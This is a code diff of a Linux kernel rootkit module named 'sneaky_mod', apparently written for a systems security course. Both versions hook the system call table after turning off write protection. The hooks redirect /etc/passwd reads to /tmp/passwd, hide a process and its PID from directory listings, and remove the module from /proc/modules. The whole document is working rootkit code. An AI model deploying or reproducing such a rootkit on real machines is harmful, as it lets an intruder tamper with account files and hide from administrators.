@@ -1,195 +1,233 @@
 #include <linux/module.h>      // for all modules 
 #include <linux/init.h>        // for entry/exit macros 
 #include <linux/kernel.h>      // for printk and other kernel bits 
-#include <linux/sched.h>       // for task_struct
+#include <asm/current.h>       // process information
+#include <linux/sched.h>
 #include <linux/highmem.h>     // for changing page permissions
 #include <asm/unistd.h>        // for system call constants
-#include <linux/fs.h>          // for linux file system
+#include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
-#include <linux/string.h>      // for string operations
-#include <linux/uaccess.h>     // for copy_to_user
-#include <linux/kprobes.h>     // for kprobes
 
-// Define the linux_dirent structure as it's not exported in newer kernels
-struct linux_dirent {
-    unsigned long   d_ino;
-    unsigned long   d_off;
-    unsigned short  d_reclen;
-    char           d_name[];
-};
+//--------------------------------
+#include <linux/dirent.h>
+#include <linux/fs.h>
+#include <linux/file.h> 
+#include <linux/slab.h>
+//--------------------------------
 
 #define PREFIX "sneaky_process"
-// Module name string (used to hide module info in /proc/modules)
-#define MOD_NAME "sneaky_mod"
+#define PASSWD_PATH "/etc/passwd"
+#define TMP_PASSWD_PATH "/tmp/passwd"
 
-// Module parameter: sneaky_pid (the process ID to hide, in string form)
+//--------------------------------
 static char *sneaky_pid = "";
 module_param(sneaky_pid, charp, 0);
-MODULE_PARM_DESC(sneaky_pid, "Process ID of sneaky_process");
+MODULE_PARM_DESC(sneaky_pid, "sneaky process pid");
+//--------------------------------
 
-// This is a pointer to the system call table
+
+//This is a pointer to the system call table
 static unsigned long *sys_call_table;
 
-// For finding sys_call_table
-static struct kprobe kp = {
-    .symbol_name = "kallsyms_lookup_name"
-};
+// Helper functions, turn on and off the PTE address protection mode
+// for syscall_table pointer
+int enable_page_rw(void *ptr){
+  unsigned int level;
+  pte_t *pte = lookup_address((unsigned long) ptr, &level);
 
-// Function prototypes
-static int enable_page_rw(void *ptr);
-static int disable_page_rw(void *ptr);
-static asmlinkage int sneaky_sys_openat(struct pt_regs *regs);
-static asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-static asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count);
+  if(pte->pte &~_PAGE_RW){
+    pte->pte |=_PAGE_RW;
+  }
 
-// Helper functions: enable and disable write protection for memory pages
-static int enable_page_rw(void *ptr) {
-    unsigned int level;
-    pte_t *pte = lookup_address((unsigned long)ptr, &level);
-    if (pte->pte & ~_PAGE_RW) {
-        pte->pte |= _PAGE_RW;
-    }
-    return 0;
+  return 0;
 }
 
-static int disable_page_rw(void *ptr) {
-    unsigned int level;
-    pte_t *pte = lookup_address((unsigned long)ptr, &level);
-    pte->pte = pte->pte & ~_PAGE_RW;
-    return 0;
+int disable_page_rw(void *ptr){
+  unsigned int level;
+  pte_t *pte = lookup_address((unsigned long) ptr, &level);
+  pte->pte = pte->pte &~_PAGE_RW;
+  return 0;
 }
 
-/*----- Original system call function pointers -----*/
-
-// Save original 'openat' syscall pointer
+// 1. Function pointer will be used to save address of the original 'openat' syscall.
+// 2. The asmlinkage keyword is a GCC #define that indicates this function
+//    should expect it find its arguments on the stack (not in registers).
 asmlinkage int (*original_openat)(struct pt_regs *);
 
-// Save original 'getdents' syscall pointer
-asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent *, unsigned int);
-
-// Save original 'read' syscall pointer
-asmlinkage ssize_t (*original_read)(int, void *, size_t);
-
-/*----- Hook functions -----*/
-
-static asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
+// Define your new sneaky version of the 'openat' syscall
+asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
-    char kpath[256] = {0};
-    long error;
-    
-    // Copy path from user space to kernel buffer
-    if (strncpy_from_user(kpath, (char __user *)regs->si, sizeof(kpath)) > 0) {
-        if (strstr(kpath, "/etc/passwd") != NULL) {
-            // Replace path with /tmp/passwd (including null terminator)
-            error = copy_to_user((char __user *)regs->si, "/tmp/passwd", strlen("/tmp/passwd") + 1);
-            if (error) {
-                return -EFAULT;
-            }
-        }
+  // --------------------------------
+  char *path = (char *)regs->si;
+
+  if (strcmp(path, PASSWD_PATH) == 0) {
+    printk(KERN_INFO "INFO: Sneaky process is redirecting %s to %s\n", 
+           PASSWD_PATH, TMP_PASSWD_PATH);
+
+    if (copy_to_user(path, TMP_PASSWD_PATH, strlen(TMP_PASSWD_PATH) + 1) != 0) {
+      printk(KERN_WARNING "WARNING: copy_to_user failed\n");
     }
-    return (*original_openat)(regs);
+  }
+  // --------------------------------
+  return (*original_openat)(regs);
 }
 
-static asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
-{
-    int nread, bpos;
-    struct linux_dirent *d;
-    char *p;
+//--------------------------------
+asmlinkage ssize_t (*original_getdents64)(struct pt_regs *);
 
-    nread = original_getdents(fd, dirp, count);
-    if (nread <= 0)
-        return nread;
+asmlinkage ssize_t sneaky_getdents64(struct pt_regs * regs){
+  struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
+  ssize_t ret = original_getdents64(regs);
 
-    for (bpos = 0; bpos < nread;) {
-        d = (struct linux_dirent *)((char *)dirp + bpos);
-        p = d->d_name;
-        
-        if ((strcmp(p, PREFIX) == 0) ||
-            (strcmp(p, sneaky_pid) == 0)) {
-            int reclen = d->d_reclen;
-            memmove((char *)dirp + bpos, (char *)dirp + bpos + reclen,
-                   nread - (bpos + reclen));
-            nread -= reclen;
-            continue;
-        }
-        bpos += d->d_reclen;
+  if (ret <= 0)
+    return ret;
+
+  unsigned int offset = 0;
+  unsigned int curr_len;
+  struct linux_dirent64 *curr;
+
+  while (offset < ret) {
+    curr = (struct linux_dirent64 *)((char *)dirp + offset);
+
+    if (strcmp(curr->d_name, PREFIX) == 0 || strcmp(curr->d_name, sneaky_pid) == 0){
+      curr_len = curr->d_reclen;
+      memmove(curr, (char *)((char *)curr + curr_len), (int)(ret - offset - curr_len));
+      ret -= curr_len;
     }
-    return nread;
-}
-
-static asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count)
-{
-    ssize_t nread;
-    char *buffer = (char *)buf;
-    char *match, *line_end;
-
-    nread = original_read(fd, buf, count);
-    if (nread <= 0)
-        return nread;
-
-    match = strstr(buffer, MOD_NAME);
-    if (match != NULL) {
-        line_end = strchr(match, '\n');
-        if (line_end != NULL) {
-            line_end++;  // Include newline character
-            memmove(match, line_end, nread - (line_end - buffer));
-            nread -= (line_end - match);
-        }
+    else{
+      offset += curr->d_reclen;
     }
-    return nread;
+  }
+  return ret;
 }
+//--------------------------------
 
-/*----- Module initialization and exit functions -----*/
+//--------------------------------
+asmlinkage ssize_t (*original_read)(struct pt_regs *);
+//Change the behavior of read
+asmlinkage ssize_t sneaky_read(struct pt_regs *regs)
+{
+  char *buffer = (char *)regs->si;
+  char *line;
+  char *line_end;
+  ssize_t ret = original_read(regs);
 
+  if (ret <= 0)
+    return ret;
+
+  unsigned long offset = 0;
+  unsigned long line_len;
+
+  int fd = regs->di;
+  struct file *file = fget(fd);
+
+  if (file == NULL) {
+    return ret;
+  }
+  
+  if(strcmp(file->f_path.dentry->d_iname, "modules") == 0){
+
+    char *file_buf = kmalloc(ret + 1, GFP_KERNEL);
+    if (file_buf == NULL) {
+      fput(file);
+      return ret;
+    }
+
+    if(copy_from_user(file_buf, buffer, ret) == 0){
+
+      file_buf[ret] = '\0';
+      
+      while (offset < ret){
+
+        line = file_buf + offset;
+        line_end = strchr(line, '\n');
+
+        if (line_end == NULL) {
+          line_end = file_buf + ret;
+        }
+
+        line_len = line_end - line + 1;
+
+        if(strstr(line, "sneaky_mod") != NULL) {
+          memmove(line, line_end + 1, file_buf + ret - line_end - 1);
+          ret -= line_len;
+        }
+        else {
+          offset += line_len;
+        }
+      }
+      if (copy_to_user(buffer, file_buf, ret) != 0){
+        printk(KERN_WARNING "WARNING: mod remove fails");
+      }
+    }
+    kfree(file_buf);
+  }
+  fput(file);
+  return ret;
+}
+//--------------------------------
+
+
+// The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
-    unsigned long (*kallsyms_lookup_name_ptr)(const char *name);
-    
-    printk(KERN_INFO "Sneaky module being loaded.\n");
+  // See /var/log/syslog or use `dmesg` for kernel print output
+  printk(KERN_INFO "Sneaky module being loaded.\n");
 
-    // Get kallsyms_lookup_name address using kprobe
-    if (register_kprobe(&kp) < 0) {
-        printk(KERN_ERR "Failed to register kprobe\n");
-        return -1;
-    }
-    kallsyms_lookup_name_ptr = (unsigned long (*)(const char *))kp.addr;
-    unregister_kprobe(&kp);
+  // Lookup the address for this symbol. Returns 0 if not found.
+  // This address will change after rebooting due to protection
+  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
 
-    // Get sys_call_table address
-    sys_call_table = (unsigned long *)kallsyms_lookup_name_ptr("sys_call_table");
-    if (!sys_call_table) {
-        printk(KERN_ERR "Unable to locate sys_call_table.\n");
-        return -1;
-    }
+  // This is the magic! Save away the original 'openat' system call
+  // function address. Then overwrite its address in the system call
+  // table with the function address of our new code.
+  original_openat = (void *)sys_call_table[__NR_openat];
 
-    // Save original syscall pointers
-    original_openat = (void *)sys_call_table[__NR_openat];
-    original_getdents = (void *)sys_call_table[__NR_getdents];
-    original_read = (void *)sys_call_table[__NR_read];
+  //--------------------------------
+  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
+  original_read = (void *)sys_call_table[__NR_read];
+  //--------------------------------
+  
+  // Turn off write protection mode for sys_call_table
+  enable_page_rw((void *)sys_call_table);
+  
+  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
 
-    // Disable write protection and hook our new syscalls
-    enable_page_rw((void *)sys_call_table);
-    sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
-    sys_call_table[__NR_getdents] = (unsigned long)sneaky_sys_getdents;
-    sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
-    disable_page_rw((void *)sys_call_table);
+  // You need to replace other system calls you need to hack here
+  //--------------------------------
+  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
+  sys_call_table[__NR_read] = (unsigned long)sneaky_read;
+  //--------------------------------
+  
+  // Turn write protection mode back on for sys_call_table
+  disable_page_rw((void *)sys_call_table);
 
-    return 0;
-}
+  return 0;       // to show a successful load 
+}  
 
-static void exit_sneaky_module(void)
+
+static void exit_sneaky_module(void) 
 {
-    printk(KERN_INFO "Sneaky module being unloaded.\n");
+  printk(KERN_INFO "Sneaky module being unloaded.\n"); 
 
-    // Restore the original syscall pointers
-    enable_page_rw((void *)sys_call_table);
-    sys_call_table[__NR_openat] = (unsigned long)original_openat;
-    sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
-    sys_call_table[__NR_read] = (unsigned long)original_read;
-    disable_page_rw((void *)sys_call_table);
-}
+  // Turn off write protection mode for sys_call_table
+  enable_page_rw((void *)sys_call_table);
 
-module_init(initialize_sneaky_module);
-module_exit(exit_sneaky_module);
+  // This is more magic! Restore the original 'open' system call
+  // function address. Will look like malicious code was never there!
+  sys_call_table[__NR_openat] = (unsigned long)original_openat;
+
+  //--------------------------------
+  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+  sys_call_table[__NR_read] = (unsigned long)original_read;
+  //--------------------------------
+
+  // Turn write protection mode back on for sys_call_table
+  disable_page_rw((void *)sys_call_table);  
+}  
+
+
+module_init(initialize_sneaky_module);  // what's called upon loading 
+module_exit(exit_sneaky_module);        // what's called upon unloading  
 MODULE_LICENSE("GPL");
